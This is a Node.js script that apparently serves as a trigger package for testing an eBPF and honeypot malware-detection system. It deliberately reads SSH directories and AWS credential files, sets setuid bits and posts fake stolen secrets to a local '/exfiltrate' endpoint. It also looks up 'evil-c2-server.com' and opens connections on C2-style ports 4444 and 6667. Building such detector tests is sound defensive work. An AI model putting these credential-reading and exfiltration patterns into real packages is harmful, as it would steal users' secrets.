const { execSync } = require("child_process");
const fs = require("fs");
const net = require("net");
const os = require("os");
const http = require("http");
const dns = require("dns");

console.log("[test-pkg] starting all feature triggers...");

// ── 1. FILE ACCESS (opensnoop → ebpf_accessed_etc, ebpf_accessed_root, ebpf_accessed_ssh) ──
try { fs.readdirSync("/etc"); console.log("[test-pkg] /etc accessed"); } catch(e) {}
try { fs.readdirSync("/root"); console.log("[test-pkg] /root accessed"); } catch(e) {}
try { fs.readdirSync(os.homedir() + "/.ssh"); console.log("[test-pkg] .ssh accessed"); } catch(e) {}

// ── 2. SECURITY SYSCALLS (strace → ebpf_security_ops, ebpf_privilege_escalation) ──
try { execSync("chmod 777 /tmp/test_ssc 2>/dev/null || true"); } catch(e) {}
try { execSync("chmod u+s /tmp/test_ssc 2>/dev/null || true"); } catch(e) {}

// ── 3. PROCESS SYSCALLS (strace → ebpf_process_ops, ebpf_spawned_process) ──
try { execSync("echo execve-test"); } catch(e) {}
try { execSync("ps aux > /tmp/ps_output 2>/dev/null || true"); } catch(e) {}
try { execSync("ls /tmp > /tmp/ls_output 2>/dev/null || true"); } catch(e) {}
try { execSync("whoami > /tmp/whoami_output 2>/dev/null || true"); } catch(e) {}

// ── 4. SENSITIVE FILE ACCESS (honeytokens → sensitive_file_read) ──
try { fs.readFileSync(os.homedir() + "/.aws/credentials"); } catch(e) {}
try { fs.readFileSync("/app/decoy_logs/aws_credentials.txt"); } catch(e) {}

// ── 5. DNS QUERY (honeypot → dns_query_to_external, contacted_external_domain) ──
try { dns.lookup("google.com", () => {}); } catch(e) {}
try { dns.lookup("evil-c2-server.com", () => {}); } catch(e) {}

// ── 6. HTTP POST to honeypot port 8080 → http_method ──
const postData = JSON.stringify({
    password: "stolen123",
    token: "eyJhbGciOiJIUzI1NiJ9.fake",
    secret: "aws-secret-key-fake"
});
try {
    const req = http.request({
        hostname: "127.0.0.1", port: 8080,
        path: "/exfiltrate", method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(postData) }
    }, (res) => { console.log("[test-pkg] HTTP POST honeypot: " + res.statusCode); });
    req.on("error", () => {});
    req.write(postData);
    req.end();
} catch(e) {}

// Also GET to honeypot
try {
    http.get("http://127.0.0.1:8080/api/key", (res) => {
        console.log("[test-pkg] HTTP GET honeypot: " + res.statusCode);
    }).on("error", () => {});
} catch(e) {}

// ── 7. C2 PORT CONNECTION (tcpconnect → ebpf_c2_port_suspected) ──
// Create listener first so connection succeeds
const server4444 = net.createServer();
server4444.listen(4444, "127.0.0.1", () => {
    const s = new net.Socket();
    s.connect(4444, "127.0.0.1", () => {
        console.log("[test-pkg] C2 port 4444 ✅");
        s.destroy(); server4444.close();
    });
    s.on("error", () => { server4444.close(); });
});

const server6667 = net.createServer();
server6667.listen(6667, "127.0.0.1", () => {
    const s = new net.Socket();
    s.connect(6667, "127.0.0.1", () => {
        console.log("[test-pkg] C2 port 6667 ✅");
        s.destroy(); server6667.close();
    });
    s.on("error", () => { server6667.close(); });
});

// ── 8. EXTERNAL IP CONNECTIONS (tcpconnect → ebpf_remote_ips_count) ──
// Use longer timeout and TCP port 53 which is always open on DNS servers
const externalTargets = [
    { host: "1.1.1.1",  port: 53 },  // Cloudflare DNS
    { host: "8.8.8.8",  port: 53 },  // Google DNS
    { host: "9.9.9.9",  port: 53 },  // Quad9 DNS
];
externalTargets.forEach(({ host, port }) => {
    const s = new net.Socket();
    s.setTimeout(5000);
    s.connect(port, host, () => {
        console.log(`[test-pkg] Connected to ${host}:${port} ✅`);
        s.destroy();
    });
    s.on("error", (e) => { console.log(`[test-pkg] ${host}:${port} failed: ${e.message}`); s.destroy(); });
    s.on("timeout", () => { console.log(`[test-pkg] ${host}:${port} timeout`); s.destroy(); });
});

setTimeout(() => {
    console.log("[test-pkg] all triggers fired ✅");
}, 6000);
